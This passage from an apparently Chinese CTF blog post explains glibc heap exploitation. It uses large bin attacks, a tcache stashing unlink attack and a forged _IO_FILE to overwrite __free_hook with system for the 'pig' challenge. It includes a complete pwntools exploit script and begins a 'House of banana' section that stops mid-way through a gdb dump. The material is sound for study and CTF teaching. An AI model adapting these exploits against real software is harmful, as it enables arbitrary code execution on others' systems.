<p><code>large bin attack</code> 可以任意地址写堆地址，我们可以使得 <code>__free_hook</code> 周围变得可写。这种手法可以从前言的文章了解，这里不再细讲，我们把 <code>large_bin_chunk.bk_nextsize -&gt; (__free_hook - 0x30)</code>，再次申请 <code>0xf0</code> 大小的 <code>chunk</code> 时会先把 <code>unsorted_bin_chunk</code> 放进 <code>large bin</code> ，再去 <code>large bin</code> 中找到合适的 <code>chunk</code> 进行切割。借此可以完成 <code>large bin attack</code>。</p>
<p>构造的结构如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028155528867.png"
                      alt="image-20231028155528867"
                ></p>
<p> 攻击后如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028155847734.png"
                      alt="image-20231028155847734"
                ></p>
<p><strong>第二次 large bin attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">second_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># second large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(_IO_list_all - <span class="number">0x20</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 1, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br></pre></td></tr></table></figure></div>



<p>第二次 <code>large bin attack</code>，我们的目标是将未来的假 <code>_IO_FILE</code>地址写到<code>_IO_list_all</code>中。上一次 <code>large bin attack</code>中使用的<code>large bin</code>是可以重用的，我们将<code>bk_nextsize</code>指针改到其他位置还能够再一次进行攻击。第二次<code>large bin attack</code>应该写的具体的堆地址应该根据堆环境进行确定，选择的偏移至关重要。为了方便起见，我们的伪造<code>_IO_FILE</code>结构体应该在<code>daddy</code>分配索引为4的<code>chunk</code>时附加送给我们的一个<code>chunk</code>中进行构造。向<code>_IO_list_all</code>中写入的是<code>large bin chunk</code>的地址，如果想要这里同时也指向假<code>_IO_FILE</code>指针，就需要计算好<code>chunk</code>的分配数量，在<code>calloc(0xE8)</code>时能够正好让这个<code>chunk</code>被拆分，这样就实现了此处可写。可以让<code>bk_nextsize</code>的值为<code>_IO_list_all-0x20</code>。</p>
<p>构造如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028160650568.png"
                      alt="image-20231028160650568"
                ></p>
<p>攻击后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028160804428.png"
                      alt="image-20231028160804428"
                ></p>
<p>这里<code>_IO_list_all</code>已经指向了我们伪造的 <code>fake_IO_FILE</code>。</p>
<p><strong>tcache stashing unlink attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>():</span><br><span class="line">    <span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">8</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(heap_address + <span class="number">0x410</span>) + p64(__free_hook - <span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x230</span>)   <span class="comment"># daddy index = 2</span></span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)   <span class="comment"># daddy index = 3</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(heap_address + <span class="number">0x19E0</span>) * <span class="number">2</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)   <span class="comment"># daddy index = 4, trigger tcache stashing unlink attack</span></span><br><span class="line"></span><br><span class="line">    fake_IO_FILE_complete = p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># _IO_read_end (0x10), _IO_read_base (0x18)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">1</span>)     <span class="comment"># _IO_write_base (0x20)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0xFFFF_FFFF_FFFF</span>) <span class="comment"># _IO_write_ptr (0x28)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_end (0x30)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span>)  <span class="comment"># _IO_buf_base (0x38)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span> + <span class="number">30</span>)  <span class="comment"># _IO_buf_end (0x40)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _mode (0xB0)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    fake_IO_FILE_complete += p64(libc_base + <span class="number">0x1E9560</span>)</span><br><span class="line">    payload = fake_IO_FILE_complete + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span> * p64(system)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Gift:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure></div>

<p>在第一次 <code>large bin attack</code>之后，我们将一个堆地址写到了<code>__free_hook-10</code>的位置，接下来就需要通过 <code>tcache stashing unlink attack</code>将这个地址用<code>_IO_str_overflow</code>函数中的<code>malloc</code>函数分配出来，然后利用 <code>memcpy</code> 将其改写为 <code>system</code> 地址，并传入 <code>/bin/sh\x00</code> 参数，通过 <code>exit</code> 函数触发即可。</p>
<p>构造的堆空间：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162001523.png"
                      alt="image-20231028162001523"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028161943651.png"
                      alt="image-20231028161943651"
                ></p>
<p>此时用 <code>calloc</code> 申请 <code>0xA0</code> 大小的堆块会跨过 <code>tcache</code> 从 <code>small bin</code> 获取， <code>tcache</code> 未满将会把 <code>small bin</code> 中的堆块先放进 <code>tcache</code> 中。</p>
<p>攻击后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162237544.png"
                      alt="image-20231028162237544"
                ></p>
<p>成功链接进入 <code>tcache</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162420262.png"
                      alt="image-20231028162420262"
                ></p>
<p>构造的 <code>fake_IO_FILE</code>:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162527785.png"
                      alt="image-20231028162527785"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028163928738.png"
                      alt="image-20231028163928738"
                ></p>
<p><code>_IO_buf_end - _IO_buf_base = 30</code>，所以申请的大小刚好为 <code>30*2+100=0xA0</code>，会把 <code>__free_hook</code> 申请出来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028164958890.png"
                      alt="image-20231028164958890"
                ></p>
<p>我们申请出来的用户空间在 <code>0x...30</code>，而 <code>&amp;__free_hook = 0x...48</code>，我们将 <code>old_buf == _IO_buf_base</code> 指向这样的地址 <code>b&#39;/bin/sh\x00&#39;+p64(system_addr)*2</code>就可以把 <code>system</code> 地址写入到 <code>__free_hook</code>，并且把 <code>_IO_buf_base -&gt;&#39;/bin/sh\x00&#39;</code> 作为其参数调用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028165339348.png"
                      alt="image-20231028165339348"
                ></p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">password = [<span class="string">b&#x27;Aa9nH3&#x27;</span>, <span class="string">b&#x27;BaBqJn&#x27;</span>, <span class="string">b&#x27;CbyWU8&#x27;</span>]</span><br><span class="line">current_user = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content_length, content = <span class="literal">None</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;message size: &#x27;</span>, <span class="built_in">str</span>(content_length).encode())</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        content = <span class="built_in">str</span>(current_user) * (content_length // <span class="number">0x30</span> * <span class="number">0x10</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">    <span class="keyword">global</span> current_user</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, password[role])</span><br><span class="line">    current_user = role</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base, system, __free_hook, _IO_list_all, heap_address</span><br><span class="line">    <span class="comment"># 部署tcache stashing unlink attack的堆环境</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):      <span class="comment"># make 5 chunk into tcache, mummy index 0~4</span></span><br><span class="line">        add(<span class="number">0xA0</span>)</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x150</span>)    <span class="comment"># peppa index 0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x120 tcache, peppa index 1~7</span></span><br><span class="line">        add(<span class="number">0x150</span>)</span><br><span class="line">        delete(i + <span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)               <span class="comment"># peppa #0 into unsorted bin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)               <span class="comment"># mummy index 5, split peppa #0</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x160</span>)              <span class="comment"># peppa index 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x130 tcache, peppa index 9~15</span></span><br><span class="line">        add(<span class="number">0x160</span>)</span><br><span class="line">        delete(i + <span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    view(<span class="number">8</span>)                 <span class="comment"># get libc base address</span></span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ECBE0</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    __free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    _IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xB0</span>)               <span class="comment"># mummy index 6, split peppa #8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取堆地址</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    heap_address = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)        <span class="comment"># get a heap address</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span>, <span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__free_hook: &#x27;</span>, <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all: &#x27;</span>, <span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap address: &#x27;</span>, <span class="built_in">hex</span>(heap_address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">first_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># first large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)     <span class="comment"># mummy index = 7</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 16</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 17</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 18</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 19</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x450</span>)     <span class="comment"># mummy index = 8, switch mummy #7 into large bin</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(__free_hook - <span class="number">0x18</span> - <span class="number">0x18</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 0, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">second_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># second large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(_IO_list_all - <span class="number">0x20</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 1, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>():</span><br><span class="line">    <span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">8</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(heap_address + <span class="number">0x410</span>) + p64(__free_hook - <span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x230</span>)   <span class="comment"># daddy index = 2</span></span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)   <span class="comment"># daddy index = 3</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(heap_address + <span class="number">0x19E0</span>) * <span class="number">2</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xA0</span>)   <span class="comment"># daddy index = 4, trigger tcache stashing unlink attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">    fake_IO_FILE_complete = p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># _IO_read_end (0x10), _IO_read_base (0x18)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">1</span>)     <span class="comment"># _IO_write_base (0x20)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0xFFFF_FFFF_FFFF</span>) <span class="comment"># _IO_write_ptr (0x28)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_end (0x30)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span>)  <span class="comment"># _IO_buf_base (0x38)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span> + <span class="number">30</span>)  <span class="comment"># _IO_buf_end (0x40)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _mode (0xB0)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    fake_IO_FILE_complete += p64(libc_base + <span class="number">0x1E9560</span>)</span><br><span class="line">    payload = fake_IO_FILE_complete + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span> * p64(system)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    leak_addr()</span><br><span class="line">    first_largebin_attack()</span><br><span class="line">    second_largebin_attack()</span><br><span class="line">    tcache_stashing_unlink_attack()</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-banana"><a href="#House-of-banana" class="headerlink" title="House of banana"></a>House of banana</h1><p><code>glibc &gt;= 2.23</code></p>
<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>在 <code>ld.so</code> 里，存在一个 <code>_rtld_global</code> 指针，指向 <code>rtld_global</code> 结构体，程序通过 <code>exit</code> 退出时，会调用 <code>rtld_global</code> 的结构体中的一系列函数来进行诸如恢复寄存器，清除缓冲区等操作。</p>
<p>其<a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.31/source/sysdeps/generic/ldsodefs.h#L308" >结构体定义 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">glibc-2.23</span></span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">p _rtld_global</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  _dl_ns = &#123;&#123;</span><br><span class="line">      _ns_loaded = 0x7ffff7ffe168,</span><br><span class="line">      _ns_nloaded = 0x4,</span><br><span class="line">      _ns_main_searchlist = 0x7ffff7ffe420,</span><br><span class="line">      _ns_global_scope_alloc = 0x0,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = 0x0,</span><br><span class="line">              __count = 0x0,</span><br><span class="line">              __owner = 0x0,</span><br><span class="line">              __nusers = 0x0,</span><br><span class="line">              __kind = 0x1,</span><br><span class="line">              __spins = 0x0,</span><br><span class="line">              __elision = 0x0,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">            __align = 0x0</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        entries = 0x0,</span><br><span class="line">        size = 0x0,</span><br><span class="line">        n_elements = 0x0,</span><br><span class="line">        free = 0x0</span><br><span class="line">      &#125;,</span><br><span class="line">      _ns_debug = &#123;</span><br><span class="line">        r_version = 0x0,</span><br><span class="line">        r_map = 0x0,</span><br><span class="line">        r_brk = 0x0,</span><br><span class="line">        r_state = RT_CONSISTENT,</span><br><span class="line">        r_ldbase = 0x0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      _ns_loaded = 0x0,</span><br><span class="line">      _ns_nloaded = 0x0,</span><br><span class="line">      _ns_main_searchlist = 0x0,</span><br><span class="line">      _ns_global_scope_alloc = 0x0,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = 0x0,</span><br><span class="line">              __count = 0x0,</span><br><span class="line">              __owner = 0x0,</span><br><span class="line">              __nusers = 0x0,</span><br><span class="line">              __kind = 0x0,</span><br><span class="line">              __spins = 0x0,</span><br><span class="line">              __elision = 0x0,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = &#x27;\000&#x27; &lt;repeats 39 times&gt;,</span><br><span class="line">            __align = 